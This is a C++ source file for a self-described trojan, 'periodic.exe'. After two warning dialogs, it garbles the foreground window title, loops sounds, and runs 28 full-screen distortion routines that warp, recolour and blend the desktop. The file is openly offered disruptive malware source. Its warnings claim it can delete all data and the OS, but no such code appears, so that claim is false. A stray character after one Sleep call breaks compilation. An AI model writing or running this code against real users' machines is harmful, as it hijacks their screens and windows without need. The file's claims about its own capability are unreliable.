#include "virtual_screen.h"
#include "shader.h"
#include <windows.h>
#define _USE_MATH_DEFINES 1
#include <cmath>
#include <intrin.h>
#include "timer.h"
#include "def.h"
#include "sound.h"

//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\

/*

Some GDI in this malware SKID hydrogen.exe LAMO
Please forgive acetic for the confusion between
the src of hydrogen.exe and my own source code :)

...

SKID!!!111!11!!!!11!!111!!!!1!!!1111!!!111!!!!1

*/

//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\

//Default GDI

DWORD WINAPI sound(LPVOID lpParam)
{
	while (1)
	{
		sound1();
		Sleep(30000);
		sound2();
		Sleep(30000);
		sound3();
		Sleep(10000);
		sound4();
		Sleep(30000);
		sound5();
		Sleep(30000);
		sound6();
		Sleep(30000);
		sound7();
		Sleep(30000);
		sound8();
		Sleep(30000);
		sound9();
		Sleep(30000);
		sound10();
		Sleep(30000);
	}
}

DWORD WINAPI garbled(LPVOID lpParam)
{
	int uVar1;
	HWND hWnd;
	int iVar2;
	uint uVar3;
	CHAR* lpString;
	CHAR local_9;
	do
	{
		iVar2 = 0;
		do
		{
			uVar1 = rdtsc();
			uVar3 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
			uVar3 = uVar3 ^ uVar3 << 0x11;
			(&local_9)[iVar2] = (CHAR)((ulonglong)(uVar3 << 5 ^ uVar3) % 0x47);
			iVar2 = iVar2 + 1;
		} while (iVar2 < 0x46);
		lpString = &local_9;
		hWnd = GetForegroundWindow();
		SetWindowTextA(hWnd, lpString);
		Sleep(10);
	} while (true);
}

void Payload(TROJAN_PAYLOAD payload, int nTime)
{
	int dwStartTime = Time;
	for (int i = 0; Time < (dwStartTime + nTime); i++)
	{
		HDC hdcScreen = GetDC(NULL);
		payload(i, hdcScreen);
		ReleaseDC(NULL, hdcScreen);
		DeleteObject(hdcScreen);
	}
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	Sleep(100);
}

void Shader(TROJAN_SHADER shader, int nTime)
{
	int dwStartTime = Time;
	HDC hdcScreen = GetDC(NULL);
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();

	BITMAPINFO bmi = { 0 };
	PRGBQUAD prgbScreen;
	HDC hdcTempScreen;
	HBITMAP hbmScreen;

	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = szScreen.cx;
	bmi.bmiHeader.biHeight = szScreen.cy;

	prgbScreen = { 0 };

	hdcTempScreen = CreateCompatibleDC(hdcScreen);
	hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
	SelectObject(hdcTempScreen, hbmScreen);

	for (int i = 0; Time < (dwStartTime + nTime); i++)
	{
		hdcScreen = GetDC(NULL);
		BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);
		shader(i, szScreen.cx, szScreen.cy, prgbScreen);
		BitBlt(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen);
		DeleteObject(hdcScreen);
		Sleep(10);
	}

	DeleteObject(hbmScreen);
	DeleteDC(hdcTempScreen);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	Sleep(100);
}

//GDI Designation

//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\

//payload1

DWORD WINAPI gdi1_sab(LPVOID lpParam)
{
	HDC desk = GetDC(0);
	RECT wRect;
	POINT wPt[3];
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	HDC deskMem = CreateCompatibleDC(desk);
	HBITMAP screenshot = CreateCompatibleBitmap(desk, sw, sh);
	SelectObject(deskMem, screenshot);
	GetWindowRect(GetDesktopWindow(), &wRect);
	while (1)
	{
		desk = GetDC(0);
		BitBlt(desk, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
		BitBlt(desk, 10, 10, sw, sh, desk, 10, 10, SRCCOPY);
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left - 30;
		wPt[0].y = wRect.top + 60;
		wPt[1].x = wRect.right - 20;
		wPt[1].y = wRect.top - 20;
		wPt[2].x = wRect.left + 10;
		wPt[2].y = wRect.bottom + 25;

		PlgBlt(deskMem, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
		BitBlt(desk, 0, 0, sw, sh, deskMem, 0, 0, SRCCOPY);
		Sleep(250);
		DeleteDC(desk);
	}
}

void gdi1(int t, int w, int h, PRGBQUAD prgbScreen)
{
	for (int i = 0; i < w * h; i++)
	{
		prgbScreen[i].rgb = (prgbScreen[i].rgb * 2) % (RGB(5, 5, 1));
	}
}

//payload2

VOID WINAPI gdi2_sab(int x, int y, int w, int h)
{
	int a = 2;
	HWND hwnd = NULL;
	HDC desk = GetDC(hwnd);
	HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
	SelectClipRgn(desk, hrgn);
	SelectObject(desk, CreateSolidBrush(RGB(rand() % 500, rand() % 500, rand() % 500)));
	BitBlt(desk, x, y, w, h, desk, x, y, !(rand() % 5) ? PATINVERT : PATCOPY);
	DeleteObject(hrgn);
	ReleaseDC(hwnd, desk);
}

DWORD WINAPI gdi2(LPVOID lpParam)
{
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	RECT wRect;
	POINT wPt[3];
	HDC deskMem = CreateCompatibleDC(desk);
	HBITMAP screenshot = CreateCompatibleBitmap(desk, sw, sh);
	SelectObject(deskMem, screenshot);
	GetWindowRect(GetDesktopWindow(), &wRect);
	int counter = 30;
	while (1)
	{
		desk = GetDC(0);
		RECT rect;
		GetWindowRect(GetDesktopWindow(), &rect);
		int w = rect.right - rect.top - 62.5, h = rect.bottom - rect.top - 62.5;
		const int size = 100;
		int x = rand() % (w + size) - size / 1, y = rand() % (h + size) - size / 1;
		BitBlt(desk, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
		BitBlt(desk, 10, 10, sw, sh, desk, 10, 10, SRCCOPY);
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left + counter;
		wPt[0].y = wRect.top - counter;
		wPt[1].x = wRect.right + counter;
		wPt[1].y = wRect.top + counter;
		wPt[2].x = wRect.left - counter;
		wPt[2].y = wRect.bottom - counter;

		PlgBlt(deskMem, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
		BitBlt(desk, 0, 0, sw, sh, deskMem, 0, 0, SRCCOPY);
		for (int i = 0; i < size; i += 12.5)
		{
			gdi2_sab(x - i / 2, y - i / 2, i, i);
		}
		Sleep(5);
	}
}

//payload3

void gdi3(int t, int w, int h, PRGBQUAD prgbScreen)
{
	for (int i = 0; i < w * h; i++)
	{
		int r = GetRValue(prgbScreen[i].rgb);
		int g = GetGValue(prgbScreen[i].rgb);
		int b = GetBValue(prgbScreen[i].rgb);
		prgbScreen[i].rgb = (RGB((2 * r) % 256, (b + t) % 256, (g + i) % 256) + int(sqrt(i >> t / (r + 5))) / 10) % (RGB(250, 250, 100));
	}
}

//payload4

void gdi4(int t, int w, int h, PRGBQUAD prgbScreen)
{
	for (int i = 0; i < w * h; i++)
	{
		int randPixel = rand() % 25;
		int tempB = GetBValue(prgbScreen[i].rgb);
		prgbScreen[i].rgb = RGB(GetBValue(prgbScreen[randPixel].rgb), GetBValue(prgbScreen[randPixel].rgb), GetBValue(prgbScreen[randPixel].rgb));
		prgbScreen[randPixel].rgb = RGB(tempB, tempB, tempB);
	}
}

//payload5

void gdi5(int t, int w, int h, PRGBQUAD prgbScreen)
{
	for (int i = 0; i < w * h; i++)
	{
		int r = GetRValue(prgbScreen[i].rgb);
		int g = GetGValue(prgbScreen[i].rgb);
		int b = GetBValue(prgbScreen[i].rgb);
		prgbScreen[i].rgb = RGB((r + 100) % 100, ((r + g + b) / 5 + t) % 100, ((r + g + b) / 5 + i) % 256) % (RGB(rand() % 500, 5, 5)) + t * 10;
	}
}

//payload6

VOID WINAPI gdi6_sab(int x, int y, int w, int h)
{
	int a = 2;
	HWND hwnd = NULL;
	HDC desk = GetDC(hwnd);
	HRGN hrgn = CreateRectRgn(x, y, w + x, h + y);
	SelectClipRgn(desk, hrgn);
	SelectObject(desk, CreateSolidBrush(RGB(rand() % 500, rand() % 500, rand() % 500)));
	BitBlt(desk, x, y, w, h, desk, x, y, PATINVERT);
	DeleteObject(hrgn);
	ReleaseDC(hwnd, desk);
}

DWORD WINAPI gdi6_sab(LPVOID lpParam)
{
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	LPCSTR text = 0;
	while (1)
	{
		desk = GetDC(0);
		RECT rect;
		GetWindowRect(GetDesktopWindow(), &rect);
		int w = rect.right - rect.top - 31.25, h = rect.bottom - rect.top - 31.25;
		const int size = 250;
		int x = rand() % (w + size) - size / 1, y = rand() % (h + size) - size / 1;
		text = "periodic";
		SetBkMode(desk, TRANSPARENT);
		SetTextColor(desk, RGB(rand() % 500, rand() % 500, rand() % 500));
		HFONT font = CreateFontA(50, 25, 0, 0, FW_THIN, 0, 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Shadows Into Light");
		SelectObject(desk, font);
		TextOutA(desk, rand() % sw, rand() % sh, text, strlen(text));
		ReleaseDC(GetDesktopWindow(), desk);
		DeleteDC(desk);
		DeleteObject(font);
		for (int i = 0; i < size; i += 50)
		{
			gdi6_sab(x - i / 2, y - i / 2, i, i);
		}
		Sleep(10);
	}
}

void gdi6(int t, HDC hdcScreen)
{
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();
	HDC hcdc = CreateCompatibleDC(hdcScreen);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, szScreen.cx, szScreen.cy);
	SelectObject(hcdc, hBitmap);
	BitBlt(hcdc, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);

	BLENDFUNCTION blf = { 0 };
	blf.BlendOp = AC_SRC_OVER;
	blf.BlendFlags = 0;
	blf.SourceConstantAlpha = 25;
	blf.AlphaFormat = 0;

	AlphaBlend(hdcScreen, ptScreen.x - t % 5, ptScreen.y, szScreen.cx, szScreen.cy, hcdc, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, blf);
	AlphaBlend(hdcScreen, ptScreen.x + t % 5, ptScreen.y, szScreen.cx, szScreen.cy, hcdc, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, blf);
	AlphaBlend(hdcScreen, ptScreen.x, ptScreen.y + t % 5, szScreen.cx, szScreen.cy, hcdc, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, blf);
	AlphaBlend(hdcScreen, ptScreen.x, ptScreen.y - t % 5, szScreen.cx, szScreen.cy, hcdc, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, blf);

	DeleteObject(hcdc);
	DeleteObject(hBitmap);
}

//payload7

void gdi7(int t, int w, int h, PRGBQUAD prgbScreen)
{
	for (int i = 0; i < w * h; i++)
	{
		int r = GetRValue(prgbScreen[i].rgb);
		int g = GetGValue(prgbScreen[i].rgb);
		int b = GetBValue(prgbScreen[i].rgb);
		prgbScreen[i].rgb = (RGB((2 * r) % 256, (b + t) % 256, (g + i) % 256) + (i >> t / (r + 1)) / 10) % (RGB(500, 500, 200));
	}
}

//payload8

void gdi8(int t, int w, int h, PRGBQUAD prgbScreen)
{
	for (int i = 0; i < w * h; i++)
	{
		int r = GetRValue(prgbScreen[i].rgb);
		int g = GetGValue(prgbScreen[i].rgb);
		int b = GetBValue(prgbScreen[i].rgb);
		prgbScreen[i].rgb = RGB((r + 100) % 256, int(sqrt((r + g + b)) / 4 + t) % 256, int(sqrt((r + g + b)) / 4 + i) % 256) % (RGB(5, 5, 25)) + t * 10;
	}
}

//payload9

DWORD WINAPI gdi9_sab(LPVOID lpParam)
{
	POINT wPt[3];
	RECT wRect;
	HDC desk = GetDC(0);
	double moveangle = 0;
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	int counter = 30;
	while (true)
	{
		desk = GetDC(0);
		BitBlt(desk, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
		BitBlt(desk, 10, 10, sw, sh, desk, 10, 10, SRCCOPY);
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left + rand() % counter;
		wPt[0].y = wRect.top - rand() % counter;
		wPt[1].x = wRect.right + rand() % counter;
		wPt[1].y = wRect.top + rand() % counter;
		wPt[2].x = wRect.left - rand() % counter;
		wPt[2].y = wRect.bottom - rand() % counter;

		PlgBlt(desk, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
		Sleep(25);
		ReleaseDC(GetDesktopWindow(), desk);
		DeleteDC(desk);
	}
}

void gdi9(int t, int w, int h, PRGBQUAD prgbScreen)
{
	for (int i = 0; i < w * h; i++)
	{
		int r = GetRValue(prgbScreen[i].rgb);
		int g = GetGValue(prgbScreen[i].rgb);
		int b = GetBValue(prgbScreen[i].rgb);
		prgbScreen[i].rgb = (RGB((r + g + b) / 3, int(sqrt(r + g + b)) / 3, (r + g + b) / 3) + t - (i)) % (RGB(5, 5, 200));
	}
}

//payload10

void gdi10(int t, int w, int h, PRGBQUAD prgbScreen)
{
	t *= 50;
	for (int i = 0; i < h; i++)
	{
		for (int j = 0; j < w; j++)
		{
			prgbScreen[i * w + j].rgb = RGB((prgbScreen[i * w + j].r + i / 50) % 256, int(sqrt(prgbScreen[i * w + j].g + j / 10)) % 256, (prgbScreen[i * w + j].b + t) % 256);
		}
	}
}

//payload11

void gdi11(int t, int w, int h, PRGBQUAD prgbScreen)
{
	for (int i = 0; i < w * h; i++) {
		int r = GetRValue(prgbScreen[i].rgb);
		int g = GetGValue(prgbScreen[i].rgb);
		int b = GetBValue(prgbScreen[i].rgb);
		prgbScreen[i].rgb = (RGB((2 * r) % 25, (b + t) % 25, (g + i) % 25) + (i >> t / (r + 1)) / 10) % (RGB(500, 500, 500));
	}
}

//payload12

void gdi12(int t, int w, int h, PRGBQUAD prgbScreen)
{
	for (int i = 0; i < w * h; i++)
	{
		int r = GetRValue(prgbScreen[i].rgb);
		int g = GetGValue(prgbScreen[i].rgb);
		int b = GetBValue(prgbScreen[i].rgb);
		prgbScreen[i].rgb = (RGB((r / 5), (r + g + b / 5), (r + g + b) / 5) + int(sqrt(i))) % (RGB(255, 255, 255));
	}
}

//payload13

void gdi13(int t, int w, int h, PRGBQUAD prgbScreen)
{
	for (int i = 0; i < w * h; i++)
	{
		int r = GetRValue(prgbScreen[i].rgb);
		int g = GetGValue(prgbScreen[i].rgb);
		int b = GetBValue(prgbScreen[i].rgb);
		prgbScreen[i].rgb = (RGB((2 * r) % 500, (b + t) % 500, (g + i) % 500) + (i >> t / (r + 1)) / 10) % (RGB(150, 150, 150));
	}
}

//payload14

void gdi14(int t, int w, int h, PRGBQUAD prgbScreen)
{
	for (int i = 0; i < h; i++)
	{
		for (int j = 0; j < w; j++)
		{
			int temp1 = (i + rand() % 3 - 2);
			if (temp1 < 0)
			{
				temp1 = -temp1;
			}
			int temp2 = (j + rand() % 3 - 2);
			if (temp2 < 0)
			{
				temp2 = -temp2;
			}
			prgbScreen[i * w + j].rgb = prgbScreen[(temp1 * w + temp2) % (w * h)].rgb;
		}
	}
}

//payload15

void gdi15(int t, int w, int h, PRGBQUAD prgbScreen)
{
	for (int i = 0; i < h; i++)
	{
		for (int j = 0; j < w; j++)
		{
			int temp1 = (i + rand() % 100 - 5);
			if (temp1 < 0)
			{
				temp1 = -temp1;
			}
			int temp2 = (j + rand() % 100 - 5);
			if (temp2 < 0)
			{
				temp2 = -temp2;
			}
			prgbScreen[i * w + j].rgb = prgbScreen[(temp1 * w + temp2) % (w * h)].rgb;
		}
	}
}

//payload16

DWORD WINAPI gdi16_sab(LPVOID lpParam)
{
	POINT wPt[3];
	RECT wRect;
	HDC desk = GetDC(0);
	double moveangle = 0;
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	int counter = 30;
	while (true)
	{
		desk = GetDC(0);
		BitBlt(desk, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
		BitBlt(desk, 10, 10, sw, sh, desk, 10, 10, SRCCOPY);
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left + rand() % counter;
		wPt[0].y = wRect.top - rand() % counter;
		wPt[1].x = wRect.right + rand() % counter;
		wPt[1].y = wRect.top + rand() % counter;
		wPt[2].x = wRect.left - rand() % counter;
		wPt[2].y = wRect.bottom - rand() % counter;

		PlgBlt(desk, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
		Sleep(250);
		ReleaseDC(GetDesktopWindow(), desk);
		DeleteDC(desk);
	}
}
void gdi16(int t, int w, int h, PRGBQUAD prgbScreen)
{
	for (int i = 0; i < w * h; i++)
	{
		prgbScreen[i].rgb = (prgbScreen[i].rgb - rand() % (i + 1)) % (RGB(255, 255, 255));
	}
}

//payload17

void gdi17(int t, int w, int h, PRGBQUAD prgbScreen)
{
	for (int i = 0; i < w * h; i++)
	{
		int r = GetRValue(prgbScreen[i].rgb);
		prgbScreen[i].rgb = (RGB((r) / 3, (r) / 3, (r) / 3) + t - (i)) % (RGB(500, 500, 500));
	}
}

//payload18

void gdi18(int t, int w, int h, PRGBQUAD prgbScreen)
{
	t *= 1;
	for (int i = 0; i < h; i++)
	{
		for (int j = 0; j < w; j++)
		{
			prgbScreen[i * w + j].rgb = RGB((prgbScreen[i * w + j].r + j / 1) % 256, (prgbScreen[i * w + j].g + j / 25) % 256, (prgbScreen[i * w + j].b + t) % 256);
		}
	}
}

//payload19

void gdi19(int t, int w, int h, PRGBQUAD prgbScreen)
{
	t *= 1;
	for (int i = 0; i < h; i++)
	{
		for (int j = 0; j < w; j++)
		{
			prgbScreen[i * w + j].rgb = RGB((prgbScreen[i * w + j].r + i / 1) % 256, (prgbScreen[i * w + j].g + i / 1) % 256, (prgbScreen[i * w + j].b + t) % 256);
		}
	}
}

//payload20

void gdi20(int t, int w, int h, PRGBQUAD prgbScreen)
{
	t *= 1;
	for (int i = 0; i < h; i++)
	{
		for (int j = 0; j < w; j++)
		{
			prgbScreen[i * w + j].rgb = RGB((prgbScreen[i * w + j].b + i / 10) % 250, (prgbScreen[i * w + j].b + j / 10) % 225, (prgbScreen[i * w + j].b + t) % 100);
		}
	}
}

//payload21

void gdi21(int t, HDC hdcScreen)
{
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();
	HDC hcdc = CreateCompatibleDC(hdcScreen);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, szScreen.cx, szScreen.cy);
	SelectObject(hcdc, hBitmap);
	BitBlt(hcdc, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, hdcScreen, ptScreen.x, ptScreen.y, SRCCOPY);

	BLENDFUNCTION blf = { 0 };
	blf.BlendOp = AC_SRC_OVER;
	blf.BlendFlags = 0;
	blf.SourceConstantAlpha = 25;
	blf.AlphaFormat = 0;

	for (int i = ptScreen.x; i <= szScreen.cx / 10; i++)
	{
		for (int j = ptScreen.y; j <= szScreen.cy / 10; j++)
		{
			StretchBlt(hcdc, i * 10, j * 10, 10, 10, hcdc, i * 10, j * 10, 1, 1, !(rand() % 2) ? SRCAND : SRCPAINT);
		}
	}
	BitBlt(hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, hcdc, ptScreen.x, ptScreen.y, SRCCOPY);
	AlphaBlend(hdcScreen, ptScreen.x - t % 10, ptScreen.y - t % 10, szScreen.cx, szScreen.cy, hcdc, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, blf);
	AlphaBlend(hdcScreen, ptScreen.x + t % 10, ptScreen.y - t % 10, szScreen.cx, szScreen.cy, hcdc, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, blf);

	DeleteObject(hcdc);
	DeleteObject(hBitmap);

	Sleep(250);
}

//payload22

void gdi22(int t, int w, int h, PRGBQUAD prgbScreen)
{
	t *= 1;
	for (int i = 0; i < h; i++)
	{
		for (int j = 0; j < w; j++)
		{
			prgbScreen[i * w + j].rgb = RGB((prgbScreen[i * w + j].r + j / 10) % 250, (prgbScreen[i * w + j].r + i / 10) % 225, (prgbScreen[i * w + j].b + t) % 100);
		}
	}
}

//payload23

void gdi23(int t, int w, int h, PRGBQUAD prgbScreen)
{
	t *= 1;
	for (int i = 0; i < h; i++)
	{
		for (int j = 0; j < w; j++)
		{
			prgbScreen[i * w + j].rgb = RGB((prgbScreen[i * w + j].r + j / 2) % 500, (prgbScreen[i * w + j].r + i / 2) % 500, (prgbScreen[i * w + j].b + t) % 500);
		}
	}
}

//payload24

void gdi24(int t, int w, int h, PRGBQUAD prgbScreen)
{
	for (int i = 0; i < w * h; i++)
	{
		int r = GetRValue(prgbScreen[i].rgb);
		prgbScreen[i].rgb = RGB((r + 1) % 250, ((r) / 1 + t) % 5, ((r) / 1 + i) % 250) % (RGB(5, 5, 250)) + t;
	}
}

//payload25

void gdi25(int t, int w, int h, PRGBQUAD prgbScreen)
{
	for (int i = 0; i < w * h; i++)
	{
		int g = GetGValue(prgbScreen[i].rgb);
		int b = GetBValue(prgbScreen[i].rgb);
		prgbScreen[i].rgb = (RGB((2 * g) % 30, (g + t) % 30, (g + i) % 30) + int(sqrt(i >> t / (b + 1))) / 10) % (RGB(5, 5, 255));
	}
}

//payload26

void gdi26(int t, int w, int h, PRGBQUAD prgbScreen)
{
	for (int i = 0; i < w * h; i++)
	{
		int r = GetRValue(prgbScreen[i].rgb);
		int b = GetBValue(prgbScreen[i].rgb);
		prgbScreen[i].rgb = (RGB((2 * b) % 256, (r + t) % 256, (r + i) % 256) + int(sqrt(i >> t / (r + 1))) / 10) % (RGB(5, 5, 255));
	}
}

//payload27

void gdi27(int t, int w, int h, PRGBQUAD prgbScreen)
{
	t *= 1;
	for (int i = 0; i < h; i++)
	{
		for (int j = 0; j < w; j++)
		{
			prgbScreen[i * w + j].rgb = RGB((prgbScreen[i * w + j].r + i / 1) % 250, (prgbScreen[i * w + j].r + j / 1) % 225, (prgbScreen[i * w + j].r + t) % 100);
		}
	}
}

//payload28

void gdi28(int t, int w, int h, PRGBQUAD prgbScreen)
{
	t *= 10;
	for (int i = 0; i < h; i++)
	{
		for (int j = 0; j < w; j++)
		{
			prgbScreen[i * w + j].rgb = RGB((prgbScreen[i * w + j].r + i / 36) % 250, (prgbScreen[i * w + j].r + j / 3) % 225, (prgbScreen[i * w + j].b + t) % 100);
		}
	}
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d)
{
	//WARNING

	if (MessageBoxW(NULL, L"!!!WARNING!!!\n\nYou have ran a Trojan known as periodic.exe that has full capacity to delete all of your data and your operating system.\n\nBy continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it is highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis.\n\nAre you sure you want to run this?", L"periodic.exe - !!!WARNING!!! ", MB_ICONWARNING | MB_YESNO) != IDYES)
		return false;

	if (MessageBoxW(NULL, L"!!!FINAL WARNING!!!\n\nThis Trojan has a lot of destructive potential. You will lose all of your data if you continue, and the creator will not be responsible for any of the damage caused. This is not meant to be malicious but simply for entertainment and educational purposes.\n\nAre you sure you want to continue?\nThis is your final chance to stop this program from execution.", L"periodic.exe - !!!FINAL WARNING!!!", MB_ICONWARNING | MB_YESNO) != IDYES)
		return false;
	//Default GDI

	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(InitTimer), (PVOID)1000, 0, NULL);

	CreateThread(0, 0, garbled, 0, 0, 0);
	CreateThread(0, 0, sound, 0, 0, 0);
	HANDLE payload1 = CreateThread(0, 0, gdi1_sab, 0, 0, 0);
	Shader(gdi1, 10);
	TerminateThread(payload1, 0);
	CloseHandle(payload1);
	RedrawWindow(0, 0, 0, 133);
	HANDLE payload2 = CreateThread(0, 0, gdi2, 0, 0, 0);
	Sleep(10000);r
	TerminateThread(payload2, 0);
	CloseHandle(payload2);
	RedrawWindow(0, 0, 0, 133);
	Shader(gdi3, 10);
	Shader(gdi4, 10);
	Shader(gdi5, 10);
	HANDLE payload6 = CreateThread(0, 0, gdi6_sab, 0, 0, 0);
	Payload(gdi6, 10);
	TerminateThread(payload6, 0);
	CloseHandle(payload6);
	RedrawWindow(0, 0, 0, 133);
	Shader(gdi7, 10);
	Shader(gdi8, 10);
	HANDLE payload9 = CreateThread(0, 0, gdi9_sab, 0, 0, 0);
	Shader(gdi9, 10);
	TerminateThread(payload9, 0);
	CloseHandle(payload9);
	RedrawWindow(0, 0, 0, 133);
	Shader(gdi10, 10);
	Shader(gdi11, 10);
	Shader(gdi12, 10);
	Shader(gdi13, 10);
	Shader(gdi14, 10);
	Shader(gdi15, 10);
	HANDLE payload16 = CreateThread(0, 0, gdi16_sab, 0, 0, 0);
	Shader(gdi16, 10);
	TerminateThread(payload16, 0);
	CloseHandle(payload16);
	RedrawWindow(0, 0, 0, 133);
	Shader(gdi17, 10);
	Shader(gdi18, 10);
	Shader(gdi19, 10);
	Shader(gdi20, 10);
	Payload(gdi21, 10);
	Shader(gdi22, 10);
	Shader(gdi23, 10);
	Shader(gdi24, 10);
	Shader(gdi25, 10);
	Shader(gdi26, 10);
	Shader(gdi27, 10);
	Shader(gdi28, 10);
	exit(1);
}